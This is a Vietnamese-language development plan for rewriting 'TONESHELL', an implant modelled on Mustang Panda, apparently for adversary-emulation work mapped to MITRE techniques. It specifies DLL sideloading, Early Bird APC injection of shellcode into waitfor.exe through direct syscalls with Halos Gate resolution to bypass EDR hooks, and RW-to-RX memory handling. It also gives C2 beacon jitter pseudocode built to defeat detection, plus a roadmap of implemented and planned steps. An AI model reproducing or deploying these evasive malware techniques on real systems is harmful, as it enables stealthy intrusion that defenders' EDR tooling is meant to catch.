# TONESHELL — Stealth Rewrite Plan

Kế hoạch thay đổi luồng C2 hiện tại của TONESHELL để giảm bề mặt detection. Đây là **rewrite chính luồng** (không phải variant), chấp nhận drift một phần khỏi MITRE 2025 Mustang Panda Reference Table (rows 168-170: T1218.010 regsvr32, T1218.013 mavinject).

**Giữ nguyên** (không liên quan chain đang đổi):
- LNK → cmd → `EssosUpdate.exe` sideload `wsdapi.dll` (trigger)
- Sandbox checks (T1497.001 process-name / T1497.003 foreground-window)
- `Handler()` throw + catch → hop (T1622 Debugger Evasion)
- Authenticode self-sign `wsdapi.dll` (T1553.002 Code Signing)
- Shellcode: FNV1A API resolve, triple-XOR decrypt, PIC
- C2 protocol wire (magic `0x18 0x04 0x04`, XOR body, hostname session ID)

**Loại bỏ**:
- `regsvr32.exe wsdapi.dll` spawn (T1218.010)
- `waitfor.exe` + `mavinject.exe /INJECTRUNNING` chain (T1218.013)
- Export `DllRegisterServer` khỏi `wsdapi.dll`

---

## 1. Injection chain mới — Early Bird APC via direct syscalls

### 1.1. Chain

```
EssosUpdate.exe                                     # sideload trigger (không đổi)
  └─ wsdapi.dll:DllMain                             # WSDAPI export triggers Handler()
      └─ Handler()                                  # checks + custom exception (không đổi)
          └─ catch(CustomException&) → InjectAndSpawn()   # REWRITE
              ├─ NtCreateUserProcess("waitfor.exe", SUSPENDED)   # direct syscall
              ├─ NtAllocateVirtualMemory(remote, size, RW)
              ├─ NtWriteVirtualMemory(remote, shellcode)         # ghi SHELLCODE, không phải DLL
              ├─ NtProtectVirtualMemory(remote, RX)              # RW → RX (tránh RWX)
              ├─ NtQueueApcThread(main_thread, shellcode_base)   # Early Bird
              └─ NtResumeThread(main_thread)                     # APC fire trước entry
          shellcode runs trong waitfor.exe → C2 với jitter (mục 2)
```

### 1.2. Rationale

| Điểm | Ý nghĩa |
|---|---|
| **Direct syscall** cho `Nt*` | Bypass userland EDR hooks trên `ntdll` (`NtQueueApcThread`, `NtWriteVirtualMemory` là hai điểm hook phổ biến nhất). Resolve syscall number từ `ntdll.dll` in-memory (Halos Gate) — không hard-code vì thay đổi theo build Windows. |
| **Ghi shellcode thẳng** (không `LoadLibraryW`) | Loại `Image Load` event cho `wsdapi.dll` trong `waitfor.exe` — dấu hiệu nổi bật nhất của mavinject variant. Đổi lại thêm "unbacked executable memory" — nhưng pattern chung của mọi in-memory loader, ít đặc thù hơn. |
| **RW → RX transition** (không RWX) | Tránh `PAGE_EXECUTE_READWRITE` — EDR thường flag mọi alloc RWX vào remote process. |
| **`waitfor.exe`** làm host | Main thread block trên `WaitForSingleObject` → hợp Early Bird (APC fire khi alertable wait đầu tiên). Microsoft-signed system utility → parent/child `EssosUpdate.exe → waitfor.exe` vẫn hợp ngữ cảnh. |
| **`SUSPENDED` + APC + `Resume`** (Early Bird) | Ẩn hơn thread hijack: không cần `SuspendThread`/`GetThreadContext`/`SetThreadContext`. APC fire trước main logic của thread. |
| **Không cần `regsvr32`** | Fresh context đạt được qua `NtCreateUserProcess`. Chain cũ cần regsvr32 chỉ để có context "sạch" gọi `DllRegisterServer` — giờ chuyển thẳng shellcode nên bỏ được. |

### 1.3. Detection surface mới

| Behavior | Tactic / TID |
|---|---|
| Cross-process memory write từ `EssosUpdate.exe` → `waitfor.exe` + `NtQueueApcThread` | Stealth / T1055.004 — Process Injection: Asynchronous Procedure Call |
| Direct syscall (resolve syscall num, invoke `syscall` bypass ntdll stub) | Stealth / T1106 — Native API (kết hợp T1027.007 sẵn có nếu resolve dynamic) |
| Unbacked executable memory trong `waitfor.exe` (RX không map file) | (memory heuristic — không TID riêng) |

**Rows cũ xoá** khỏi Flow.md + Phase file downstream: T1218.010, T1218.013. **Rows mới thêm**: T1055.004, T1106.

### 1.4. Files sửa

| File | Thay đổi |
|---|---|
| `src/common/register.cpp` | Bỏ `RegisterSelf()` (spawn regsvr32) + `DllRegisterServer()`. Viết `InjectAndSpawn()` mới. |
| `src/common/handler.cpp` | `catch(CustomException&)` gọi `InjectAndSpawn()` thay `RegisterSelf()`. Giữ nguyên throw. |
| `src/common/syscalls.hpp` + `syscalls.asm` (mới) | Halos Gate resolver + ML64 syscall stubs. |
| `src/wsdapi/wsdapi.def` | Xoá export `DllRegisterServer`. Giữ WSDAPI exports (sideload trigger). |
| `src/wsdapi/CMakeLists.txt` | Xoá `DLL_REG_LOG_FILE`. Giữ `DLL_SH_RUNNER_LOG_FILE` nếu muốn log path injection. |
| `src/wsdapi/dllmain.cpp` | Không đổi. |
| `src/shellcode/entry.cpp` | Sửa `PerformTaskLoop` — 2-tier jitter + immediate follow-up (mục 2.3). |
| `src/shellcode/prng.hpp` (mới) | `xorshift64` PRNG state + `xorshift64_seed` + `xorshift64_next` (mục 2.5). |
| `src/shellcode/shellcode.hpp` | Thêm `GetTickCount64_t` + `fp_GetTickCount64` vào `func_pointers`. |
| `src/shellcode/shellcode_util.cpp` | Thêm resolve `GetTickCount64` từ kernel32 trong `FetchFunctions`. |
| `src/shellcode/CMakeLists.txt` | Thêm `-DTONESHELL_JITTER_*` compile definitions cho `shellcode-pe`. |
| `CMakePresets.json` | Thêm 4 cache variable jitter (mục 2.4). |

### 1.5. Direct syscall — implementation notes

- Resolve `ntdll.dll` base từ PEB.Ldr (dùng lại PEB walk trong `register.cpp::GetCurrModulePath`).
- Parse Export Directory, tìm `Nt*` (hoặc `Zw*` — cùng bytes) exports cần dùng.
- Stub layout Win10/11 x64: `mov r10, rcx ; mov eax, <SYSCALL_NUM> ; syscall ; ret` → SYSCALL_NUM là dword tại `stub+4`.
- Hook detection: byte đầu = `0xE9` (jmp) → Halos Gate fallback: syscall num tăng đơn điệu theo alphabet của export → tính từ neighbor sạch.
- MSVC x64 không hỗ trợ inline asm → **bắt buộc `.asm` file** compile bằng ML64:
  ```cmake
  enable_language(ASM_MASM)
  set_source_files_properties(syscalls.asm PROPERTIES LANGUAGE ASM_MASM)
  ```

---

## 2. Adaptive jitter — 2-tier + response bypass

Import chiến lược của `dnscat2/go-client` (`pkg/tunnel/dns/dns.go:253-263`). TONESHELL persistent TCP, áp dụng ở tầng `PerformTaskLoop`.

### 2.1. Two-tier schedule

| State | Range | Điều kiện |
|---|---|---|
| **Burst** | `0` (immediate) | Server vừa trả task thực (EXEC_CMD / FILE_DOWNLOAD / FILE_UPLOAD / RECONNECT) — beacon ngay để nộp kết quả hoặc nhận task tiếp |
| **Idle** | 5000 + rand(0..25000) ms → **5–30 s** | Server trả IDLE hoặc beacon lỗi — không có task pending |

Burst tạo pattern (idle dài → 1-2 beacon nhanh → idle) giống Cobalt Strike / Saitama. Mặc định fall về Idle → không heartbeat rhythm cố định → phá FFT/autocorrelation detection.

### 2.2. Immediate follow-up after task

Protocol hiện tại dùng one-shot socket (`connect → send → recv → close`) — không có persistent connection để "burst trên cùng socket" như dnscat2. Thay vào đó:

- Khi server trả response **không phải idle/nop** (có task thực sự): beacon kế tiếp có delay = 0 — gửi ngay để nộp kết quả hoặc nhận task tiếp theo.
- Khi vừa hoàn thành execution task: beacon kế tiếp cũng delay = 0 để gửi `NotifyTaskComplete` ngay, không chờ jitter gate.
- Kết quả: burst pattern (idle dài → 1-2 beacon nhanh khi có task → idle) — giống fingerprint Cobalt Strike / Saitama, nhưng thích ứng với protocol one-shot.

### 2.3. Pseudocode

```cpp
// src/shellcode/entry.cpp — PerformTaskLoop
static xorshift64_state prng;
static uint64_t nextSend = 0;
bool seeded = false;

while (true) {
    // Compute sleep until next beacon window
    uint64_t now = ctx->fp.fp_GetTickCount64();
    int64_t remaining = (int64_t)(nextSend - now);
    if (remaining > 0) {
        ctx->fp.fp_Sleep((DWORD)remaining);
    }

    // Send beacon / request task
    result = PerformBeacon(ctx, msg_buf, resp_buf);
    if (result != ERROR_SUCCESS) {
        // … existing error handling …
        nextSend = ctx->fp.fp_GetTickCount64() + ComputeJitter(&prng, false);
        continue;
    }

    bool had_task = false;
    if (resp_buf->resp_type == RESP_TYPE_EXEC_CMD) {
        result = PerformExecTask(…);
        had_task = true;
    } else if (resp_buf->resp_type == RESP_TYPE_FILE_DOWNLOAD) {
        result = PerformFileDownloadTask(…);
        had_task = true;
    } else if (resp_buf->resp_type == RESP_TYPE_FILE_UPLOAD) {
        result = PerformFileUploadTask(…);
        had_task = true;
    } else if (resp_buf->resp_type == RESP_TYPE_IDLE) {
        had_task = false;
    } else if (resp_buf->resp_type == RESP_TYPE_TERMINATE) {
        return;
    } else if (resp_buf->resp_type == RESP_TYPE_RECONNECT) {
        // … existing reconnect logic …
        had_task = true;
    }

    // Active tier if server just sent us a real task; Idle otherwise.
    // Also zero-delay if had_task to enable immediate result submission.
    if (had_task) {
        nextSend = 0;  // burst: next beacon fires immediately
    } else {
        nextSend = ctx->fp.fp_GetTickCount64() + ComputeJitter(&prng, false);
    }
}

uint32_t ComputeJitter(xorshift64_state* p, bool active) {
    if (active) {
        return TONESHELL_JITTER_ACTIVE_MIN_MS
             + xorshift64_next(p) % (TONESHELL_JITTER_ACTIVE_MAX_MS - TONESHELL_JITTER_ACTIVE_MIN_MS);
    }
    return TONESHELL_JITTER_IDLE_MIN_MS
         + xorshift64_next(p) % (TONESHELL_JITTER_IDLE_MAX_MS - TONESHELL_JITTER_IDLE_MIN_MS);
}
```

### 2.4. Compile-time knobs (CMake cache variables)

Thêm vào `CMakePresets.json::configurePresets[0].cacheVariables`:

| Variable | Default | Ý nghĩa |
|---|---|---|
| `TONESHELL_JITTER_ACTIVE_MIN_MS` | `1000` | Cận dưới bucket Active |
| `TONESHELL_JITTER_ACTIVE_MAX_MS` | `3000` | Cận trên bucket Active |
| `TONESHELL_JITTER_IDLE_MIN_MS`   | `5000` | Cận dưới bucket Idle |
| `TONESHELL_JITTER_IDLE_MAX_MS`   | `30000` | Cận trên bucket Idle |

Không expose CLI arg — shellcode không có argv. Nếu cần đổi cho lab khác dải, override tại configure:
`cmake --preset default -DTONESHELL_JITTER_IDLE_MAX_MS=60000 …`
### 2.5. PRNG

`xorshift64` (không cần crypto strength). Seed từ `__rdtsc() ^ fp_GetTickCount64()` một lần khi `PerformTaskLoop` chạy lần đầu. Bỏ dùng CRT `rand()` — CRT không có trong shellcode PIC context.

Implementation notes:
- `__rdtsc()` có sẵn qua `<intrin.h>` (compiler intrinsic, không link).
- `GetTickCount64` chưa có trong `func_pointers` / `FetchFunctions` — cần thêm resolve từ `kernel32.dll` qua FNV1A, cùng type `using GetTickCount64_t = decltype(&GetTickCount64);` và error code `FAIL_GET_GETTICKCOUNT64`.

---

## 3. Flow.md / Reference Table impact

**Hàng cần xoá** (Flow.md rows 9-13 tương ứng):

| # cũ | Behavior | Lý do xoá |
|---|---|---|
| 9-10 | RegisterSelf spawn regsvr32; DllRegisterServer entry | Chain gọi này bị bỏ |
| 11-12 | DllRegisterServer spawn waitfor.exe suspended; mavinject inject | Thay bằng in-process direct-syscall inject |
| 13 | wsdapi.dll loaded into waitfor.exe via mavinject QueueUserAPC + LoadLibraryW | Thay bằng "shellcode written + APC to Early Bird" |

**Hàng cần thêm**:

| # mới | Behavior | Tactic / TID |
|---|---|---|
| — | `wsdapi.dll` resolve syscall numbers từ ntdll in-memory (Halos Gate) | Stealth / T1027.007 — Dynamic API Resolution (đã có, có thể enhance context) |
| — | `wsdapi.dll` spawn `waitfor.exe` SUSPENDED via `NtCreateUserProcess` direct syscall | Execution / T1106 — Native API |
| — | `wsdapi.dll` allocate + write shellcode to `waitfor.exe` remote memory | Stealth / T1055 — Process Injection (parent) |
| — | `wsdapi.dll` queue APC to main thread + resume (Early Bird) | Stealth / T1055.004 — Process Injection: APC |
| — | shellcode `PerformTaskLoop` uses adaptive jitter 1-3s active / 5-30s idle | C2 / T1029 — Scheduled Transfer *hoặc* Stealth / T1497.003 — Time Based Evasion (thảo luận khi map lại) |

Chạy `/document-flow` lại và `/map-technique` cho các hàng mới sau khi implement xong.

---

## 4. Roadmap implement

1. **Phase A — direct syscalls (mục 1)**
   - [ ] Thêm `enable_language(ASM_MASM)` vào root `CMakeLists.txt`
   - [ ] Viết `src/common/syscalls.hpp` (Halos Gate resolver + inline hash lookup)
   - [ ] Viết `src/common/syscalls.asm` (ML64 stubs: 6 hàm Nt* cần dùng)
   - [ ] Viết `src/common/inject.cpp::InjectAndSpawn()` dùng syscalls
   - [ ] Sửa `handler.cpp` catch block chuyển sang `InjectAndSpawn()`
   - [ ] Xoá `RegisterSelf()` + `DllRegisterServer()` khỏi `register.cpp`
   - [ ] Xoá `DllRegisterServer` khỏi `wsdapi.def`
   - [ ] Xoá `DLL_REG_LOG_FILE` khỏi `src/wsdapi/CMakeLists.txt`
   - [ ] Rebuild + test chain trên VIVOBOOK (non-admin htargaryen)

2. **Phase B — jitter (mục 2)** ✅ DONE
   - [x] Thêm 4 cache vars vào `CMakePresets.json`
   - [x] Thêm `-DTONESHELL_JITTER_*` compile definitions vào `src/shellcode/CMakeLists.txt`
   - [x] Thêm `GetTickCount64_t` + `fp_GetTickCount64` vào `func_pointers` (`shellcode.hpp`)
   - [x] Thêm resolve `GetTickCount64` từ kernel32 trong `FetchFunctions` (`shellcode_util.cpp`)
   - [x] Viết `xorshift64` helper trong `src/shellcode/prng.hpp`
   - [x] Sửa `PerformTaskLoop` trong `entry.cpp` — 2-tier jitter + immediate follow-up sau task
   - [x] Test end-to-end với controlServer: verify beacon inter-arrival phân bố 5-29s idle, burst 0ms on task

3. **Phase C — docs**
   - [ ] Update `Flow.md` (xoá 5 rows cũ, thêm 5 rows mới)
   - [ ] Chạy `/map-technique` cho rows mới
   - [ ] Update `README.md`: đổi mô tả chain (bỏ regsvr32/mavinject), thêm section jitter
   - [ ] Update `Build.md`: thêm 4 knob jitter vào bảng CMake cache variables
   - [ ] Update `../../../../mitre-outline/Scenario 2.md` mapping nếu Phase file downstream đã reference T1218.010/T1218.013

---

## 5. Trade-off summary

| Aspect | Trước | Sau | Đánh giá |
|---|---|---|---|
| Fidelity với Mustang Panda 2025 | 100% (regsvr32 + mavinject là TTP thật) | Partial (mất 2 rows, thêm 2 rows tương đương-hoặc-mạnh hơn) | Chấp nhận |
| Process tree depth | 3 (`EssosUpdate → regsvr32 → waitfor` + `mavinject` sibling) | 2 (`EssosUpdate → waitfor`) | Ngắn hơn, ít node hơn |
| LOLBAS artifacts | 2 (regsvr32.exe, mavinject.exe) | 0 | Big win |
| Cross-process memory events | 1 (mavinject write + LoadLibrary) | 1 (in-process write + APC) | Ngang |
| Beacon rhythm fingerprint | Fixed hoặc single-value | 2-tier adaptive jitter + response bypass | Big win |
| YARA/EDR hooking on ntdll | Vulnerable (dùng imports thường) | Bypassed (direct syscall) | Big win |
| Complexity | Medium | High (ASM + Halos Gate + PRNG) | Chi phí implement lớn hơn |

---

## 6. Điểm cần user confirm trước khi implement

Tất cả đã confirm sơ bộ ở turn trước:
- ✅ Host = `waitfor.exe`
- ✅ Giữ `Handler()` throw+catch (T1622)
- ✅ Giữ Authenticode signing (T1553.002)
- ✅ Chấp nhận drift MITRE 2025 fidelity

Còn open (đề xuất default, user override nếu cần):
- ✅ Jitter bucket defaults: **Burst 0ms, Idle 5-30s** (tested on VIVOBOOK — beacon inter-arrival confirmed 5-29s range, burst on task)
- Direct syscall resolver strategy: **Halos Gate** (không cần external syscall table dictionary)
- Host process argv: `waitfor.exe /T 99999 dummy_event` (để process chờ vô hạn không exit sớm)
